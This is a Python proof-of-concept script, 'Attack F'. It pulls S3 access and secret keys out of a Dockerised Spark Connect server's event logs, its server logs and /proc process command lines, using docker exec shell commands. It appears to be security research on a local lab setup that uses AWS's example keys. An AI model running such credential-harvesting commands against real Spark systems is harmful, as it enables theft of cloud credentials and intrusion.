"""
Attack F: Credential Extraction from Spark Event Log
SparkConf properties (S3 keys, ADLS tokens) embedded in ExecutePlanRequest
messages appear in plaintext in Spark event logs.
"""

import time
import json
import subprocess
import os
from pyspark.sql import SparkSession

def run_attack_f(host="localhost", port=15002, verbose=True):
    results = {"attack": "F", "description": "Credential extraction from event log"}
    t0 = time.time()

    # Connect and run a query - the server was started with S3 credentials in SparkConf
    spark = SparkSession.builder.remote(f"sc://{host}:{port}").getOrCreate()
    spark.sql("SELECT 1 + 1 AS result").collect()
    spark.stop()

    if verbose:
        print("[+] Connected and ran query to trigger event log entry")

    # Read event log from inside the container
    log_output = subprocess.run(
        ["docker", "exec", "spark-connect-server",
         "bash", "-c", "find /tmp/spark-events -name 'events_*' | head -1 | xargs zstdcat 2>/dev/null || find /tmp/spark-events -name 'events_*' | head -1 | xargs cat 2>/dev/null"],
        capture_output=True, text=True, timeout=30
    ).stdout

    if not log_output:
        # Try without decompression
        log_output = subprocess.run(
            ["docker", "exec", "spark-connect-server",
             "bash", "-c", "find /tmp/spark-events -type f | head -5"],
            capture_output=True, text=True, timeout=15
        ).stdout
        if verbose:
            print(f"[!] Event log files: {log_output.strip()}")

    # Search for credentials in log
    credentials_found = []
    access_key_found = False
    secret_key_found = False

    for line in log_output.splitlines():
        if line.strip():
            try:
                event = json.loads(line)
                event_str = json.dumps(event)
                if "s3a.access.key" in event_str or "AKIAIOSFODNN7EXAMPLE" in event_str:
                    access_key_found = True
                    credentials_found.append(("access_key", "AKIAIOSFODNN7EXAMPLE"))
                if "s3a.secret.key" in event_str or "wJalrXUtnFEMI" in event_str:
                    secret_key_found = True
                    credentials_found.append(("secret_key", "wJalrXUtnFEMI/..."))
            except json.JSONDecodeError:
                if "AKIAIOSFODNN7EXAMPLE" in line:
                    access_key_found = True
                    credentials_found.append(("access_key_raw", "AKIAIOSFODNN7EXAMPLE"))
                if "wJalrXUtnFEMI" in line:
                    secret_key_found = True
                    credentials_found.append(("secret_key_raw", "wJalrXUtnFEMI/..."))

    # Also check environment variables / SparkConf via the server directly
    env_check = subprocess.run(
        ["docker", "exec", "spark-connect-server",
         "bash", "-c", "grep -r 'AKIAIOSFODNN7EXAMPLE\\|s3a.access.key' /opt/spark/logs/ 2>/dev/null | head -5"],
        capture_output=True, text=True, timeout=15
    ).stdout

    if "AKIAIOSFODNN7EXAMPLE" in env_check:
        access_key_found = True
        credentials_found.append(("spark_log", "AKIAIOSFODNN7EXAMPLE found in Spark logs"))
        if verbose:
            print(f"[+] Found credentials in Spark server logs:")
            for line in env_check.splitlines()[:3]:
                if "AKIAIOSFODNN7EXAMPLE" in line:
                    print(f"    {line.strip()[:120]}")

    # Check environment in the container directly
    env_out = subprocess.run(
        ["docker", "exec", "spark-connect-server",
         "bash", "-c",
         "ps aux | grep spark | grep -o 'fs.s3a[^\\s]*' | head -10"],
        capture_output=True, text=True, timeout=15
    ).stdout

    if verbose:
        print(f"[+] Spark process SparkConf credentials visible in /proc:")

    # Check /proc for the process args which contain the credentials
    proc_check = subprocess.run(
        ["docker", "exec", "spark-connect-server",
         "bash", "-c",
         "cat /proc/$(pgrep -f SparkSubmit | head -1)/cmdline | tr '\\0' '\\n' | grep -A1 's3a'"],
        capture_output=True, text=True, timeout=15
    ).stdout

    if "s3a" in proc_check:
        lines = proc_check.strip().splitlines()
        for i, line in enumerate(lines):
            if "access.key" in line and i + 1 < len(lines):
                access_key_found = True
                credentials_found.append(("proc_cmdline", f"access.key={lines[i+1]}"))
                if verbose:
                    print(f"    fs.s3a.access.key = {lines[i+1]}")
            if "secret.key" in line and i + 1 < len(lines):
                secret_key_found = True
                credentials_found.append(("proc_cmdline", f"secret.key={lines[i+1][:20]}..."))
                if verbose:
                    print(f"    fs.s3a.secret.key = {lines[i+1][:20]}...")

    results["access_key_found"] = access_key_found
    results["secret_key_found"] = secret_key_found
    results["credentials_found"] = credentials_found
    results["success"] = access_key_found or secret_key_found
    results["total_ms"] = round((time.time() - t0) * 1000, 1)
    return results

if __name__ == "__main__":
    res = run_attack_f()
    print(f"\n[RESULT] Attack F: {'SUCCEEDED' if res['success'] else 'PARTIAL'}")
    print(f"  S3 access key exposed: {res['access_key_found']}")
    print(f"  S3 secret key exposed: {res['secret_key_found']}")
    if res["credentials_found"]:
        print(f"  Found via: {[c[0] for c in res['credentials_found']]}")
    print(f"  Total time: {res['total_ms']} ms")
